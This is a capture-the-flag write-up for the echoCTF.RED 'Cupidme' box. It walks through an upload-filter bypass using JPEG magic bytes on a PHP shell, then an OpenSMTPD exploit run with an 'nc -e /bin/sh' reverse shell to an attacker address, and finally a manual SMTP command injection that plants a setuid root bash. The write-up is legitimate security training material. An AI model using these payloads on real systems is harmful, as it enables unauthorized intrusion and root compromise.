---
layout: default
title : muzec - Cupidme - echoCTF.RED
---

```
TEE HEE HEE! Cupid, is an imaginary character. However, Cupid is not the only thing that is imaginary on this system (the box security is equally imaginary)...

Tickle cupid the right way and you'll be surprised.
```

### Enumeration With Nmap

`nmap -p- --min-rate 10000 -oA nmap/allports -v 10.0.30.187`

```
# Nmap 7.91 scan initiated Thu Dec  2 20:33:19 2021 as: nmap -p- --min-rate 10000 -oA nmap/allports -v 10.0.30.187
Increasing send delay for 10.0.30.187 from 80 to 160 due to 67 out of 222 dropped probes since last increase.
Increasing send delay for 10.0.30.187 from 160 to 320 due to 73 out of 242 dropped probes since last increase.
Increasing send delay for 10.0.30.187 from 320 to 640 due to 34 out of 111 dropped probes since last increase.
Warning: 10.0.30.187 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.0.30.187
Host is up (0.15s latency).
Not shown: 51513 filtered ports, 14021 closed ports
PORT   STATE SERVICE
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Thu Dec  2 20:34:57 2021 -- 1 IP address (1 host up) scanned in 97.69 seconds
```

Scanning for full ports we know we have only one port open so let try some default and service detection switch on our nmap commands.

`nmap -sC -sV -oA nmap/normal -p 80 10.0.30.187`

```
# Nmap 7.91 scan initiated Thu Dec  2 20:38:46 2021 as: nmap -sC -sV -oA nmap/normal -p 80 10.0.30.187
Nmap scan report for 10.0.30.187
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to Cupid's homepage

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec  2 20:38:58 2021 -- 1 IP address (1 host up) scanned in 12.04 seconds
```

We know we are hiting only HTTP port so let jump to it without wasting to much of time.

![image](https://user-images.githubusercontent.com/69868171/144709361-718cbed5-7689-4488-b33a-c83c4fd0aa93.png)

Interesting let check what we have in the source page.

![image](https://user-images.githubusercontent.com/69868171/144709419-39a06b64-8e9b-4e21-b10e-61fe39cf8931.png)

That is some good hidden form for uploading.

```
<form action="upload.php" method="post" enctype="multipart/form-data"> Select image to upload:<br/><input type="file" name="image" id="image"><input type="submit" value="Upload Image" name="submit"></form>
```

Now we know it hidden when not inspect the webpage and add the html code to make it visible to us.

![image](https://user-images.githubusercontent.com/69868171/144709682-ff23b85d-c358-4092-a6e7-5f6444a1afc9.png)

Now we are talking let try uploading a file `php or jpg` first using burp suite to intercept the request to see what is going on.

![image](https://user-images.githubusercontent.com/69868171/144709787-39432e94-f1f0-4426-8878-10a1c0f97872.png)

But seems we hit the rock let try changing `Content-Type: application/x-php` to `Content-Type: image/jpeg` let see what happened.

![image](https://user-images.githubusercontent.com/69868171/144709912-50e93ec6-250f-4531-b0cc-028341fe17bc.png)

Ahhh ok that the same error let try uploading a valid jpeg image to observe what happened.

![image](https://user-images.githubusercontent.com/69868171/144710011-0f557b1c-0bf3-409b-98e9-f2f9f0449d73.png)

Now that is a valid jpeg image but the issue is the size we can only upload `The maximum file size supported is 39 bytes` now it getting more interesting let try some tricks.

### Creating A JPEG File

```
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/cupidme]
└─$ touch muzec.txt      
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/cupidme]
└─$ echo -n -e '\xff\xd8\xff'>muzec.txt
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/cupidme]
└─$ file muzec.txt  
muzec.txt: JPEG image data
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/cupidme]
```

Now let try uploading it let see what happened.

![image](https://user-images.githubusercontent.com/69868171/144710205-58c0429a-a5c1-4909-b855-d1a13e2d8b22.png)

Boom so the extension does not really matter hehehehe now let create our payload.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/cupidme]
└─$ touch shell.php
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/cupidme]
└─$ echo -n -e '\xff\xd8\xff'>shell.php
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/echoctf/cupidme]
└─$ file shell.php
shell.php: JPEG image data
```

![image](https://user-images.githubusercontent.com/69868171/144710402-38090405-e6d1-417c-af2e-116da21b4d18.png)

Now let confirm the the size hope is not over `39 bytes` .

![image](https://user-images.githubusercontent.com/69868171/144710441-68b17efd-fa10-42b7-8600-5d780036a986.png)

We are cool now let upload it.

![image](https://user-images.githubusercontent.com/69868171/144710488-2233b88a-f25b-467a-a83c-894aea8a49ba.png)

Boom uploaded and we have the path to access it let hit it.

![image](https://user-images.githubusercontent.com/69868171/144710526-45e3fd97-3bba-445a-95ed-32db18ffd978.png)

Now let add our command to execute a command.

![image](https://user-images.githubusercontent.com/69868171/144710557-48c1616f-0586-4a44-82a5-774c6d854e33.png)

Boom we are good let get a reverse shell back to our terminal.

![image](https://user-images.githubusercontent.com/69868171/144710627-3302eecc-d22c-4626-a2d2-0d77f75057a6.png)

I use python one liner reverse shell to get back shell back to our terminal.

![image](https://user-images.githubusercontent.com/69868171/144710739-54ce8dd2-d803-4953-b583-ef00a4438ded.png)

Now we are good let get root and we are done.

### Privilege Escalation

```
www-data@cupidme:/home/ETSCTF$ ss -tulpn
Netid                State                 Recv-Q                 Send-Q                                 Local Address:Port                                  Peer Address:Port                                                                                                                                                                                                              
udp                  UNCONN                0                      0                                         127.0.0.11:43308                                      0.0.0.0:*                                                                                                                                                                                                                 
tcp                  LISTEN                0                      128                                        127.0.0.1:9001                                       0.0.0.0:*                    users:(("ss",pid=2330,fd=5),("bash",pid=2241,fd=5),("python",pid=2240,fd=5),("sh",pid=2218,fd=5),("python",pid=2217,fd=5),("sh",pid=2216,fd=5))                                              
tcp                  LISTEN                0                      128                                          0.0.0.0:80                                         0.0.0.0:*                    users:(("nginx",pid=39,fd=6))                                                                                                                                                                
tcp                  LISTEN                0                      128                                       127.0.0.11:41975                                      0.0.0.0:*                                                                                                                                                                                                                 
tcp                  LISTEN                0                      5                                          127.0.0.1:25                                         0.0.0.0:*                                                                                                                                                                                                                 
```

Now seems we have a port running locally 25 SMTP let grab the banner with Ncat.

```
www-data@cupidme:/home/ETSCTF$ nc -vn 127.0.0.1 25
(UNKNOWN) [127.0.0.1] 25 (?) open
220 cupidme.echocity-f.com ESMTP OpenSMTPD
```

We are dealing with `OpenSMTPD` let check for some exploit.

![image](https://user-images.githubusercontent.com/69868171/144711018-f5fdb80d-259b-4db3-9b2d-e053e9502c16.png)

We found an exploit on exploit-db written in python3 so i download it and transfer it to my target.

```
www-data@cupidme:/tmp$ ls
47984.py
www-data@cupidme:/tmp$ chmod +x 47984.py
www-data@cupidme:/tmp$ python3 127.0.0.1 25 'nc -e /bin/sh 10.10.0.186 1337'
python3: can't open file '127.0.0.1': [Errno 2] No such file or directory
www-data@cupidme:/tmp$ python3 47984.py 127.0.0.1 25 'nc -e /bin/sh 10.10.0.186 1337'
[*] OpenSMTPD detected
[*] Connected, sending payload
[*] Payload sent
[*] Done
www-data@cupidme:/tmp$ 
```
Now let check our Ncat listener and boom we are root.

![image](https://user-images.githubusercontent.com/69868171/144711168-467d3601-6528-411c-8a21-42ba020cf7c5.png)

We are done and a quick way to root with using the python script exploit.

```
www-data@cupidme:/tmp$ nc -v localhost 25                                                                                                                         [1/1]
localhost [127.0.0.1] 25 (?) open                                                  
220 cupidme.echocity-f.com ESMTP OpenSMTPD
hello cupid                                                                        
500 5.5.1 Invalid command: Command unrecognized
HELO cupid                                                                         
250 cupidme.echocity-f.com Hello cupid [127.0.0.1], pleased to meet you
MAIL FROM:<;install -m 6755 /bin/bash /tmp/root;>
250 2.0.0 Ok  
RCPT TO:<root>                                                                     
250 2.1.5 Destination address valid: Recipient ok
DATA                                                                               
354 Enter mail, end with "." on a line by itself
.                                                                                  
250 2.0.0 19966164 Message accepted for delivery
QUIT         
221 2.0.0 Bye            
www-data@cupidme:/tmp$ ls
47984.py  root
www-data@cupidme:/tmp$ ./root -p
root-5.0# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
root-5.0# 
```

We are done thanks for reading mate.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
